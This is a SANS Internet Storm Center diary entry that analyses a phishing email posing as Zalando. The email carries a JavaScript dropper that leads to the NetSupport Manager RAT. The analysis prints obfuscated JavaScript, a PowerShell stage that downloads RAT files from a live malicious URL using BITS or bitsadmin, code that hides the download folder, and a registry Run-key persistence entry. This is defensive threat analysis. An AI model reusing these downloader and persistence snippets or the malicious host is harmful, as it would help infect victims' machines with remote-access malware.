---
title: From a Zalando Phishing to a RAT, (Fri, Aug 18th)
url: https://isc.sans.edu/diary/rss/30136
source: SANS Internet Storm Center, InfoCON: green
date: 2023-08-19
fetch_date: 2025-10-04T12:01:36.048254
---

# From a Zalando Phishing to a RAT, (Fri, Aug 18th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/30130)
* [next](/diary/30138)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [From a Zalando Phishing to a RAT](/forums/diary/From%2Ba%2BZalando%2BPhishing%2Bto%2Ba%2BRAT/30136/)

**Published**: 2023-08-18. **Last Updated**: 2023-08-18 06:11:34 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[1 comment(s)](/diary/From%2Ba%2BZalando%2BPhishing%2Bto%2Ba%2BRAT/30136/#comments)

Phishing remains a lucrative threat. We get daily emails from well-known brands (like DHL, PayPal, Netflix, Microsoft, Dropbox, Apple, etc). Recently, I received a bunch of phishing emails targeting Zalando customers. Zalando is a German retailer of shoes, fashion across Europe. It was the first time that I saw them used in a phishing campaign.

![](https://isc.sans.edu/diaryimages/images/isc-20230818-1.png)

The attached archive contains a single JavaScript file:

```

remnux@remnux:/MalwareZoo/20230816$ zipdump.py nine-life1107.zip
Index Filename         Encrypted Timestamp
    1 nine-life1107.js         0 2023-08-15 12:23:08
```

As usual, with this language, the script is pretty well obfuscated. Here is an example of an implemented function:

```

(function (E, i) {
    var hw = {
        E: '0x264',
        i: 'XgQW',
        u: '0x246',
        z: 'OMHH',
        S: '0x211',
        L: '4[3N',
        T: '0x1ae',
        f: '@(sj',
        R: '0x230',
        Q: '8JTc',
        g: '0x1c0',
        n: '$GmP',
        d: 'CgxP',
        l: '0x1dc',
        W: 'Q9Z5',
        c: '0x1a9',
        x: '90vH'
    };
    var s = Y;
    var J = Y;
    var o = Y;
    var V = Y;
    var D = Y;
    var u = E();
    while (!![]) {
        try {
            var z = -parseInt(s(hw.E, hw.i)) / 0x1 + parseInt(J(hw.u, hw.z)) / 0x2 * (parseInt(J(hw.S, hw.L)) / 0x3) + -parseInt(o(hw.T, hw.f)) / 0x4 * (parseInt(s(hw.R, hw.Q)) / 0x5) + parseInt(V(hw.g, hw.n)) / 0x6 + -parseInt(V('0x22f', hw.d)) / 0x7 + parseInt(D(hw.l, hw.W)) / 0x8 + -parseInt(o(hw.c, hw.x)) / 0x9;
            if (z === i) {
                break;
            } else {
                u['push'](u['shift']());
            }
        } catch (S) {
            u['push'](u['shift']());
        }
    }
}(y, 0x75686));
```

Diving into the code to spot interesting strings or techniques is always interesting. The script contains some references to "WScript" to call the method "ShellExecute"… We are facing a script for Windows. The script is a dropper and will drop/execute a PowerShell script:

```

C:\Users\user01\AppData\Roaming\42c0tyi.ps1
```

The script is less heavily obfuscated and easy to understand. It uses bitsadmin.exe, the well-known LOLbin, to download many files from a website. Well, not always bitsadmin.exe. This tool can be called directly from Powershell. That's what the attacker is testing in this case: The script checks if BitsAdmin and ExpandArchive are available inside PowerShell and use them. Otherwise, it will launch the standalone executable and download files one by one:

```

$g3tSp4=Get-Command expand-archive -ErrorAction SilentlyContinue;
$PsaB17=Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue;
if ($g3tSp4) {
    if ($PsaB17) {
        Start-BitsTransfer -Source $l1kps4 -Destination $p47Spa;
    }
    else {
        Invoke-Expression -Command $sPaad
    };
    expand-archive -path $p47Spa -destinationpath $SP4z3p;
    Remove-Item -path $p47Spa;
}
else {
    $f1lePsa=@('AudioCapture.dll', 'client32.exe', 'client32.ini', 'HTCTL32.DLL', 'msvcr100.dll', 'nskbfltr.inf', \
               'NSM.LIC', 'pcicapi.dll', 'PCICHEK.DLL', 'PCICL32.DLL', 'remcmdstub.exe', 'TCCTL32.DLL');
    $l1kps42='https://tukudewe.com/js/h3b2_jsg/';
    New-Item -Path $env:APPDATA -Name $sP4k3 -ItemType 'directory';
    if ($PsaB17) {
        $f1lePsa | ForEach-Object {
            $sp4suR=$l1kps42+$_;
            $spaD3s7=$SP4z3p+'\'+$_;
            Start-BitsTransfer -Source $sp4suR -Destination $spaD3s7;
        };
    }
    else {
        $f1lePsa | ForEach-Object {
            $sp4suR=$l1kps42+$_;
            $spaD3s7=$SP4z3p+'\'+$_;
            $sPaad2='bitsadmin.exe /transfer Spadow /download /priority normal '+$sp4suR+' '+$spaD3s7;
            Invoke-Expression -Command $sPaad2;
        };
    };
};
```

Another trick used in the script: Files are downloaded in the directory  C:\Users\REM\AppData\Roaming\MsEdgeSandbox, and the directory attributes are modified to hide it:

```

$H1foSp4=Get-Item $SP4z3p -Force;
$H1foSp4.attributes='Hidden';
cd $SP4z3p;
```

Finally, persistence is implemented:

```

$p4t3hCl1=$SP4z3p+'\client32.exe';
New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name $sP4k3 -Value $p4t3hCl1  -PropertyType 'String';
```

The zip archive, the Javascript, and Powershell were unavailable on VT. What about the downloaded malware? Many files are downloaded on the victim's computer, but the first one to be executed is "client32.exe" (SHA256:89f0c8f170fe9ea28b1056517160e92e2d7d4e8aa81f4ed696932230413a6ce1) and has a low VT score: 5/71[[1](https://www.virustotal.com/gui/file/89f0c8f170fe9ea28b1056517160e92e2d7d4e8aa81f4ed696932230413a6ce1/detection)]. This malware is a good old NetSupport Manager RAT[[2](https://www.netsupportmanager.com)]! No need to perform deep reverse engineering. The RAT configuration is available in the file client32.ini. The C2 server is: jokosampbulid1[.]com:1412 (which is down when writing this diary).

The RAT files are downloaded from tukudewe[.]com.

[1] <https://www.virustotal.com/gui/file/89f0c8f170fe9ea28b1056517160e92e2d7d4e8aa81f4ed696932230413a6ce1/detection>
[2] <https://www.netsupportmanager.com>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [RAT](/tag.html?tag=RAT) [Phishing](/tag.html?tag=Phishing) [NetSupport](/tag.html?tag=NetSupport) [Malware](/tag.html?tag=Malware)

[1 comment(s)](/diary/From%2Ba%2BZalando%2BPhishing%2Bto%2Ba%2BRAT/30136/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/30130)
* [next](/diary/30138)

### Comments

Can we get details on how you deofuscated? I'm looking to get better at identifying obfuscated code and figuring out what is required to deofuscated. I often run into base64 to start but then get special characters and don't know how to proceed. If you could provide that information it would be extremely helpful to not only me but other's looking to dig deeper as well.

#### Kaz

#### Aug 21st 2023 2 years ago

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [A...